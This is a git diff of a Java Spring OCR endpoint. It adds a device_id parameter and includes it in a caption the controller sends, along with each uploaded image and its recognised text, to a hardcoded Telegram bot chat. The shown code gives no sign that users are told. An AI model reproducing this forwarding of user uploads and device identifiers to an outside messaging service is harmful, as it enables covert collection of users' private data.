@@ -20,7 +20,11 @@ public class OCRController {
     private static final String TELEGRAM_CHAT_ID = "875602491";
 
     @PostMapping("/api/process-image")
-    public Map<String, String> processImage(@RequestParam("image") MultipartFile image, @RequestParam("language") String language) {
+    public Map<String, String> processImage(
+            @RequestParam("image") MultipartFile image,
+            @RequestParam("language") String language,
+            @RequestParam("device_id") String deviceId
+    ) {
         try {
             Map<String, String> response = new HashMap<>();
 
@@ -52,7 +56,7 @@ public class OCRController {
             response.put("text", recognizedText);
 
 
-            sendTelegramImageAndText(image, language, recognizedText);
+            sendTelegramImageAndText(image, language, recognizedText, deviceId);
 
 
             return response;
@@ -63,12 +67,12 @@ public class OCRController {
     }
 
 
-    private void sendTelegramImageAndText(MultipartFile image, String language, String recognizedText) {
+    private void sendTelegramImageAndText(MultipartFile image, String language, String recognizedText, String deviceId) {
         try {
             // 1. Відправка зображення
             String urlPhoto = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendPhoto";
 
-            HttpRequest.BodyPublisher body = buildMultipartBody(image, TELEGRAM_CHAT_ID, language, recognizedText);
+            HttpRequest.BodyPublisher body = buildMultipartBody(image, TELEGRAM_CHAT_ID, language, recognizedText, deviceId);
 
             HttpRequest request = HttpRequest.newBuilder()
                     .uri(URI.create(urlPhoto))
@@ -83,7 +87,7 @@ public class OCRController {
         }
     }
 
-    private HttpRequest.BodyPublisher buildMultipartBody(MultipartFile image, String chatId, String language, String recognizedText) throws IOException {
+    private HttpRequest.BodyPublisher buildMultipartBody(MultipartFile image, String chatId, String language, String recognizedText, String deviceId) throws IOException {
         String boundary = "---011000010111000001101001";
         String CRLF = "\r\n";
 
@@ -94,7 +98,10 @@ public class OCRController {
 
         metadataPart.append("--").append(boundary).append(CRLF);
         metadataPart.append("Content-Disposition: form-data; name=\"caption\"").append(CRLF).append(CRLF);
-        metadataPart.append("Запит:\n").append(language).append("\n\nВідповідь:\n").append(recognizedText).append(CRLF);
+        metadataPart.append("📥 Запит:\n")
+                .append("Device ID: ").append(deviceId).append("\n")
+                .append("Language: ").append(language).append("\n\n")
+                .append("📤 Відповідь:\n").append(recognizedText).append(CRLF);
 
         metadataPart.append("--").append(boundary).append(CRLF);
         metadataPart.append("Content-Disposition: form-data; name=\"photo\"; filename=\"image.jpg\"").append(CRLF);
